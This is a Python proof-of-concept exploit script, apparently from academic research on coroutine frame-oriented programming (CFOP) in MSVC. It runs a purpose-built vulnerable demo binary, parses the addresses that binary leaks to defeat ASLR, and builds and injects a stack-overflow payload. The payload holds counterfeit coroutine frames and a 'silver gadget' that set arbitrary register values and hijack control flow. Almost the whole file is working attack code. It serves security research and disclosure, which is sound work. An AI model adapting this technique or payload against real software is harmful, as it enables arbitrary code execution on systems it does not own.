import subprocess
import time

def xstr(hex_number):
    padded_hex = f"{hex_number:016x}"
    inverted_hex = ''.join(reversed([padded_hex[i:i+2] for i in range(0, 16, 2)]))
    return inverted_hex

proc = subprocess.Popen(
    ".\\msvc_cfop_poc\\x64\\PoC\\msvc_cfop_poc.exe",
    stdout=subprocess.PIPE,
    stdin=subprocess.PIPE,
    stderr=subprocess.PIPE
)

"""
Arbitrary code execution PoC.
This PoC shows how to use silver gadgets in MSVC for setting more than one argument using CFOP.

Expected result of the exploit: the following is printed, showing the arbitrary values of the arguments
param1:14fe20 param2:4343434343434343 param3:4242424242424242 param4:4444444444444444

Details on the exploit:
A stack buffer overflows after exploiting a buffer overflow vulnerability.
This buffer overwrites the coroutine handle and injects multiple counterfeit coroutine frames.
Then, it calls the silver gadget and sets the arbitrary register values.
After that, another hijacked call calls printParameters()
A information leakeage vulnerability is introduced, as to bypass ASLR.

We recommend reading our paper to fully understand this PoC, and also every other attack possible.
However, here are the detailed steps:
1) The handler gets hijacked; coroutine c1 resumes after the c2() call
2) c1 attempts to resume (using the continuation object) c2(), but instead calls the silver gadget.
3) Inside the silver gadget, the register values are set (due to the offsets corresponding to payload addresses)
4) After the silver gadget returns, c1() is destroyed, but instead calls printParameters()
"""

# EXPLOIT PAYLOAD
HANDLE_ADDR = 0x14fe10
P1_FRAME_START = 0x14fe20
P2_FRAME_START = 0x14fe50
P3_FRAME_START = 0x14fe80
C1_REAL_RESUME_PTR = 0x0000000140002890 
C2_REAL_RESUME_PTR = 0x0000000140002b30 
C3_REAL_RESUME_PTR = 0x0000000140002dd0
C1_REAL_DESTROY_PTR = 0x0000000140002830 
C2_REAL_DESTROY_PTR = 0x0000000140002ad0 
C3_REAL_DESTROY_PTR = 0x0000000140002d70
RESUME_INDEX_0 = 0x0001000000000000
RESUME_INDEX_1 = 0x0001000400000000
ARGTEST_ADDR = 0x0000000140001800
SILVER_GADGET_ADDR = 0x00000001400017C0
SILVER_RDX = 0x4343434343434343
SILVER_R8 = 0x4242424242424242
SILVER_R9 = 0x4444444444444444



# Start the application and get the leaked addresses
expected_line = "Handler address: "
while True:
    output = proc.stdout.readline().decode()
    print(output.strip())
    if expected_line in output:
        handler_str = output.split("Handler address: ")[1]
        hex_value = handler_str.strip()
        int_value = int(hex_value, 16)
        HANDLE_ADDR = int_value
        P1_FRAME_START = HANDLE_ADDR + 0x10
        P2_FRAME_START = P1_FRAME_START + 0x30
        P3_FRAME_START = P1_FRAME_START + 0x30
        break

expected_line = "Silver gadget: "
while True:
    output = proc.stdout.readline().decode()
    print(output.strip())
    if expected_line in output:
        handler_str = output.split("Silver gadget: ")[1]
        hex_value = handler_str.strip()
        int_value = int(hex_value, 16)
        SILVER_GADGET_ADDR = int_value
        break

expected_line = "PrintParameters function: "
while True:
    output = proc.stdout.readline().decode()
    print(output.strip())
    if expected_line in output:
        handler_str = output.split("PrintParameters function: ")[1]
        hex_value = handler_str.strip()
        int_value = int(hex_value, 16)
        ARGTEST_ADDR = int_value
        break


frame_payload = xstr(C1_REAL_RESUME_PTR) + xstr(ARGTEST_ADDR) +\
                xstr(P2_FRAME_START) + xstr(RESUME_INDEX_1) +\
                xstr(0x0) + xstr(0x0) +\
                xstr(SILVER_GADGET_ADDR) + xstr(0x4545454545454545) +\
                xstr(0x42424242)*12 +\
                xstr(SILVER_R8) + xstr(SILVER_RDX) +\
                xstr(0x0) + xstr(0x1) +\
                xstr(SILVER_R9) + xstr(0x0)


hex_payload = 'A'*0x80 + xstr(P1_FRAME_START) + xstr(0x0) + frame_payload
raw_payload = bytes.fromhex(hex_payload)
print("payload: "+str(raw_payload))
        

# Now we wait for the program to ask for input, where we inject the payload
expected_line = "Welcome to the CFOP PoC"
while True:
    output = proc.stdout.readline().decode()
    print(output.strip())

    if expected_line in output:
        print(f"Process PID: {proc.pid}")
        print("Pausing execution. Attach a debugger if you want and press Enter to continue...")
        input()

        print("Sending payload...")
        
        proc.stdin.write(raw_payload + b"\n")
        proc.stdin.flush()
        
        print("Process resumed")

    time.sleep(0.1)

proc.wait()